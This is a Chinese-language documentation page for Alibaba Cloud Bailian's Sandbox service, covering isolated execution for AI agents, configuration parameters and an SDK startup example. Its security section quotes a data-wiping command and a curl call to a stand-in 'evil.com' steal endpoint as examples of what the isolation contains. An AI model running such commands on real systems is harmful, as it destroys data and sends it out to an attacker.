# 沙箱

沙箱（Sandbox）是阿里云百炼平台提供的**云端隔离执行环境服务**，为 AI 智能体提供安全、可控、可复现的代码运行、浏览器自动化与文件处理能力。每个沙箱实例在独立的容器中运行，具备资源隔离（CPU/内存）、文件系统隔离和网络策略隔离，不共享宿主环境，也不与其他实例通信。

## 在百炼平台的不同场景中，这个概念如何使用

沙箱不是独立应用，而是作为底层运行时基础设施，被多个上层能力模块按需调用：

- **Managed Agents（托管智能体）**：  
  每个 Managed Agent 的会话（Session）默认绑定一个沙箱实例。智能体调用 `bash`、`read`、`write`、`web_fetch` 等内置工具时，所有命令执行、文件读写、依赖安装均发生在该沙箱内；挂载的上传文件（`/mnt/session/uploads/`）和记忆库（`/mnt/memory/`）也通过沙箱文件系统访问。沙箱生命周期与会话强关联，支持暂停/恢复以保持上下文状态。

- **Sandbox SDK/API 直接调用**：  
  开发者可通过 E2B 兼容 SDK 或原生 REST API 手动创建、连接、管理沙箱实例。适用于需要精细控制执行环境的场景，例如：构建自定义 Agent 运行时、集成到非百炼工作流、或实现跨模型任务编排（如“Qwen3 调度 → Browser 拉取 → Code Interpreter 清洗”）。

- **LLM Application（智能体应用）**：  
  当智能体应用启用「工具调用」且配置了需沙箱支撑的工具（如网页采集、代码执行类 MCP 服务），平台自动为其分配沙箱资源。开发者无需显式管理，但可通过 `environment_id` 指定预置的沙箱模版（如 `browser` 或 `all-in-one`），从而控制基础镜像、资源配置和网络策略。

- **安全防护体系**：  
  沙箱是百炼默认安全防护的关键载体。其天然隔离性实现了「工具调用拦截」「凭证隔离」「恶意脚本限制」等默认防护能力——即使模型生成危险命令（如 `rm -rf /` 或 `curl http://evil.com/steal`），也仅作用于沙箱内部临时文件系统，且受网络白名单严格约束。

> ✅ 注意：沙箱**不提供大语言模型**，也不参与推理过程；它只负责执行模型规划出的下游操作（code、browser、file、network）。模型选择、提示词工程、RAG 检索等均由上层 Agent 或 Application 控制。

## 关键参数和配置

| 参数 | 说明 | 必填 | 常见值/约束 |
|------|------|------|-------------|
| `template` / `templateCode` | 模版唯一标识符，决定基础镜像、资源配置和高级设置 | ✅ | `code-interpreter-v1`、`browser`、`all-in-one`，或自定义模版 code（控制台创建后获得） |
| `api_url` | 百炼沙箱服务地址 | ✅ | `https://{workspace_id}.cn-beijing.maas.aliyuncs.com/api/v1/agentstudio/sandbox`（替换 `{workspace_id}`） |
| `headers.Authorization` | 实际业务鉴权凭证 | ✅ | `Bearer <百炼 API Key>`（从控制台 [API-KEY](https://bailian.console.aliyun.com/?tab=model#/api-key) 获取） |
| `api_key` | E2B SDK 格式兼容字段（**仅校验，不鉴权**） | ✅（SDK） | 必须为 `e2b_` 开头 + 十六进制字符（如 `e2b_123456789`）；推荐直接使用阿里云 UID |
| `timeoutMs`（SDK） / `timeout`（API） | 实例创建/连接超时（毫秒/秒） | ⚠️建议填 | SDK：浏览器类 ≥300,000；AIO 类 ≥900,000<br>API：范围 `[300, 604800]` 秒（5 分钟 ~ 7 天） |
| `allow_internet_access`（API） | 是否允许公网出向访问 | ❌ | `true`（默认）或 `false`；若设 `false`，需配合 `network.allowOut` 精确放行 |
| `network.allowOut`（API） | 出口流量白名单 | ❌ | 支持域名（`example.com`）、CIDR（`192.168.0.0/16`）、IP（`1.1.1.1`）；多个用英文逗号分隔 |
| `lifecycle.on_timeout`（API） | 实例超时后行为 | ❌ | `"pause"`（推荐，保留状态可恢复）或 `"terminate"`（立即释放） |

> ⚠️ 版本强约束：**必须使用 `e2b==2.31.0`**。更高版本调用 `Sandbox.create()` 将返回 HTTP 405 错误（服务端协议兼容性限制）。

## 面向开发者，简洁实用

- **快速起步三步走**：  
  1️⃣ 控制台开通服务 + 授予 `AliyunServiceRoleForSFMSandbox` 权限；  
  2️⃣ 创建模版（选镜像、配规格、设网络）→ 获取 `templateCode`；  
  3️⃣ 用 `e2b==2.31.0` SDK 写 5 行代码启动并执行：
  ```python
  from e2b import Sandbox
  sbx = Sandbox.create(
      api_url="https://your-workspace.cn-beijing.maas.aliyuncs.com/api/v1/agentstudio/sandbox",
      api_key=f"e2b_{YOUR_ALIYUN_UID}",
      headers={"Authorization": "Bearer sk-xxx"},
      template="your-template-code",
      timeoutMs=600_000,
  )
  result = sbx.run("python -c 'print(2+2)'")  # 输出: 4
  sbx.close()  # 主动释放
  ```

- **避坑指南**：  
  - 模版构建未完成（`status != "ready"`）时无法创建实例；  
  - 实例最大存活 7 天（含暂停时间），超时自动释放，**不可续期**；  
  - `api_key` 是占位符，**真正鉴权靠 `Authorization` Header**；  
  - 浏览器沙箱监听 `3000` 端口，全能型额外开放 `5000` 端口（Code Interpreter）；  
  - 文件挂载路径固定：上传文件 → `/mnt/session/uploads/`，记忆库 → `/mnt/memory/<name>/`。

沙箱即开即用、按需付费、安全隔离——它是让 AI 真正“动手做事”的可信执行底座。

## 关联主题页

- [sandbox](../guides/sandbox.md)
- [sandbox api](../api/sandbox-api.md)
- [managed agents](../guides/managed-agents.md)
- [llm application](../guides/llm-application.md)
- [security guide](../guides/security-guide.md)


